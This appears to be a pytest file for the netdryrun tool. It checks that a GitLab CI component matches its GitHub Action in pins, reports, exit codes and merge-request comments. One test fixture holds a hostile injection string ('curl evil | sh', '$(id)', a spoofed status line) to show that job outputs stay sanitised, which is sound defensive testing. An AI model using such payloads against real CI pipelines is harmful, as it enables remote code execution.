"""The GitLab CI/CD component (templates/netdryrun.yml) must stay equivalent to the GitHub Action:
same pins, stale reports removed, and job outputs that lab text cannot spoof or turn into shell."""
import json
import os
import re
import subprocess
import sys
from pathlib import Path

import yaml

import netdryrun

ROOT = Path(__file__).parents[1]
TEMPLATE = ROOT / "templates" / "netdryrun.yml"


def _component():
    spec, body = yaml.safe_load_all(TEMPLATE.read_text(encoding="utf-8"))
    return spec["spec"]["inputs"], body


def _script() -> str:
    _, body = _component()
    (job,) = body.values()
    (script,) = job["script"]
    return script


def test_component_pins_match_the_action_and_the_release():
    inputs, _ = _component()
    action = yaml.safe_load((ROOT / "action.yml").read_text(encoding="utf-8"))["inputs"]
    clab = action["containerlab-version"]["default"]
    assert inputs["containerlab-version"]["default"] == clab
    assert inputs["image"]["default"].endswith(f":{clab}")  # containerlab's image is tagged by its version
    assert inputs["netdryrun-package"]["default"] == f"netdryrun=={netdryrun.__version__}"
    for name in ("path", "json-report", "junit-report", "settle", "hold"):
        assert inputs[name]["default"] == action[name]["default"], name


def test_component_uses_every_input_and_only_declared_ones():
    inputs, _ = _component()
    text = TEMPLATE.read_text(encoding="utf-8").split("\n---\n", 1)[1]
    used = set(re.findall(r"\$\[\[\s*inputs\.([\w-]+)\s*\]\]", text))
    assert used == set(inputs)


def test_component_publishes_reports_even_when_checks_fail():
    _, body = _component()
    (job,) = body.values()
    art = job["artifacts"]
    assert art["when"] == "always"
    assert art["reports"]["junit"] == "$[[ inputs.junit-report ]]"
    assert art["reports"]["dotenv"] == "netdryrun.env"


def test_component_removes_stale_reports_before_the_run():
    script = _script()
    rm = script.index("rm -f")
    assert rm < script.index("netdryrun run")
    for f in ('"$NDR_JSON"', '"$NDR_JUNIT"', '"$NDR_MARKDOWN"', "netdryrun.env"):
        assert f in script[rm:script.index("\n", rm)]


def test_component_exits_with_netdryruns_exit_code():
    script = _script()
    assert "NDR_EXIT=$?" in script
    assert script.rstrip().endswith('exit "$NDR_EXIT"')
    assert "env -i" in script  # the lab gets a minimal environment, not CI_JOB_TOKEN


def _dotenv(tmp_path, rep: dict | None, exit_code: str) -> dict:
    code = _script().split("<<'EOF'\n", 1)[1].rsplit("\nEOF", 1)[0]
    (tmp_path / "r.json").write_text(json.dumps(rep) if rep is not None else "")
    env = {**os.environ, "NDR_JSON": str(tmp_path / "r.json"), "NDR_EXIT": exit_code}
    subprocess.run([sys.executable, "-c", code], env=env, cwd=tmp_path, check=True)
    lines = (tmp_path / "netdryrun.env").read_text().splitlines()
    return dict(line.split("=", 1) for line in lines)


def test_component_outputs_cannot_be_spoofed_or_inject_shell(tmp_path):
    passed = {"status": "passed", "summary": {"passed": 3, "failed": 0}, "inconclusive_reason": None}
    assert _dotenv(tmp_path, passed, "0") == {"NETDRYRUN_STATUS": "passed", "NETDRYRUN_PASSED": "3",
                                              "NETDRYRUN_FAILED": "0", "NETDRYRUN_INCONCLUSIVE_REASON": ""}
    # a report committed in the MR claims "passed", but the run itself exited 2 (config error)
    assert _dotenv(tmp_path, passed, "2")["NETDRYRUN_STATUS"] == "error"
    assert _dotenv(tmp_path, None, "1")["NETDRYRUN_STATUS"] == "error"
    hostile = {"status": "inconclusive", "summary": {"passed": 0, "failed": 1},
               "inconclusive_reason": "r1: x\"; curl evil | sh; echo \"$(id)`id`'\nNETDRYRUN_STATUS=passed"}
    out = _dotenv(tmp_path, hostile, "3")
    assert out["NETDRYRUN_STATUS"] == "inconclusive"
    assert len(out) == 4
    assert not set(out["NETDRYRUN_INCONCLUSIVE_REASON"]) & set("`$\\\"'\n")


# ------------------------------------------------------------------- 0.3.3 (f): verdict artifact, MR comment

import http.server  # noqa: E402
import threading  # noqa: E402

from netdryrun import agent_result  # noqa: E402


def test_component_writes_and_keeps_the_agent_result():
    inputs, body = _component()
    assert inputs["verdict-report"]["default"] == "netdryrun-verdict.json"
    assert inputs["mr-comment"]["default"] == "false"
    assert inputs["mr-comment-token-variable"]["default"] == "NETDRYRUN_GITLAB_TOKEN"
    script = _script()
    assert '--verdict "$NDR_VERDICT"' in script
    rm = script.index("rm -f")
    assert '"$NDR_VERDICT"' in script[rm:script.index("\n", rm)]   # a committed verdict file never counts
    (job,) = body.values()
    assert "$[[ inputs.verdict-report ]]" in job["artifacts"]["paths"]


def _note_script() -> str:
    return _script().split("<<'NOTE'\n", 1)[1].rsplit("\nNOTE", 1)[0]


class FakeGitLab(http.server.BaseHTTPRequestHandler):
    """The two GitLab notes endpoints the component uses, recording each request."""
    notes: list = []
    calls: list = []

    def _reply(self, code, data):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):  # noqa: N802
        FakeGitLab.calls.append(("GET", self.path, self.headers.get("PRIVATE-TOKEN"), None))
        self._reply(200, FakeGitLab.notes)

    def _write(self, method):
        data = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        FakeGitLab.calls.append((method, self.path, self.headers.get("PRIVATE-TOKEN"), data["body"]))
        self._reply(200 if method == "PUT" else 201, {"id": 7})

    def do_POST(self):  # noqa: N802
        self._write("POST")

    def do_PUT(self):  # noqa: N802
        self._write("PUT")

    def log_message(self, *a):
        pass


def _comment(tmp_path, status, verdict, notes=(), token="glpat-x", iid="12", enabled="true"):
    FakeGitLab.notes, FakeGitLab.calls = list(notes), []
    srv = http.server.HTTPServer(("127.0.0.1", 0), FakeGitLab)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    (tmp_path / "summary.md").write_text("## Netdryrun\n\nsummary\n", encoding="utf-8")
    (tmp_path / "verdict.json").write_text(json.dumps(verdict), encoding="utf-8")
    (tmp_path / "netdryrun.env").write_text(f"NETDRYRUN_STATUS={status}\n", encoding="utf-8")
    env = {"PATH": os.environ.get("PATH", ""), "PYTHONPATH": str(ROOT / "src"),
           "NDR_VERDICT": str(tmp_path / "verdict.json"), "NDR_MARKDOWN": str(tmp_path / "summary.md"),
           "NDR_MR_COMMENT": enabled, "NDR_TOKEN_VAR": "NETDRYRUN_GITLAB_TOKEN",
           "CI_API_V4_URL": f"http://127.0.0.1:{srv.server_port}/api/v4", "CI_PROJECT_ID": "42",
           "CI_MERGE_REQUEST_IID": iid, "NETDRYRUN_GITLAB_TOKEN": token}
    p = subprocess.run([sys.executable, "-c", _note_script()], env=env, cwd=tmp_path, capture_output=True, text=True)
    srv.shutdown()
    return p, FakeGitLab.calls


def _result(status, failed=0):
    return {"schema": agent_result.RESULT_SCHEMA, "status": status, "passed": 4, "failed": failed,
            "verdict": agent_result.VERDICTS.get(status, agent_result.DO_NOT_APPLY)}


def test_the_mr_comment_is_posted_with_the_fixed_header(tmp_path):
    p, calls = _comment(tmp_path, "failed", _result("failed", 1))
    assert p.returncode == 0, p.stderr
    get, post = calls
    assert get[0] == "GET" and get[1].startswith("/api/v4/projects/42/merge_requests/12/notes") and get[2] == "glpat-x"
    assert post[0] == "POST" and post[1] == "/api/v4/projects/42/merge_requests/12/notes"
    lines = post[3].split("\n")
    assert lines[0] == "<!-- netdryrun-comment -->"
    assert lines[1] == agent_result.pr_comment_header(_result("failed", 1)).split("\n")[0]
    assert post[3].endswith("summary\n")


def test_the_mr_comment_is_updated_in_place(tmp_path):
    old = [{"id": 3, "body": "someone else"}, {"id": 9, "body": "<!-- netdryrun-comment -->\nold"}]
    _, calls = _comment(tmp_path, "passed", _result("passed"), notes=old)
    assert [c[:2] for c in calls][1] == ("PUT", "/api/v4/projects/42/merge_requests/12/notes/9")


def test_the_header_is_held_to_the_runs_checked_status(tmp_path):
    # the verdict file says passed, the run's checked status is failed: never a passing header
    _, calls = _comment(tmp_path, "failed", _result("passed"))
    assert '"status": "error"' in calls[-1][3].split("\n")[1]


def test_no_comment_without_a_merge_request_a_token_or_the_input(tmp_path):
    for kw in ({"iid": ""}, {"token": ""}, {"enabled": "false"}):
        p, calls = _comment(tmp_path, "passed", _result("passed"), **kw)
        assert p.returncode == 0 and calls == [], kw
    p, _ = _comment(tmp_path, "passed", _result("passed"), token="")
    assert "NETDRYRUN_GITLAB_TOKEN" in p.stdout   # says which variable to set


def test_a_comment_failure_never_changes_the_result(tmp_path):
    env_url = "http://127.0.0.1:9/api/v4"   # nothing listens there
    (tmp_path / "summary.md").write_text("s\n", encoding="utf-8")
    (tmp_path / "verdict.json").write_text(json.dumps(_result("passed")), encoding="utf-8")
    (tmp_path / "netdryrun.env").write_text("NETDRYRUN_STATUS=passed\n", encoding="utf-8")
    env = {"PATH": os.environ.get("PATH", ""), "PYTHONPATH": str(ROOT / "src"), "NDR_VERDICT": "verdict.json",
           "NDR_MARKDOWN": "summary.md", "NDR_MR_COMMENT": "true", "NDR_TOKEN_VAR": "T", "T": "x",
           "CI_API_V4_URL": env_url, "CI_PROJECT_ID": "1", "CI_MERGE_REQUEST_IID": "1"}
    p = subprocess.run([sys.executable, "-c", _note_script()], env=env, cwd=tmp_path, capture_output=True, text=True)
    assert p.returncode == 0 and "WARNING" in p.stdout
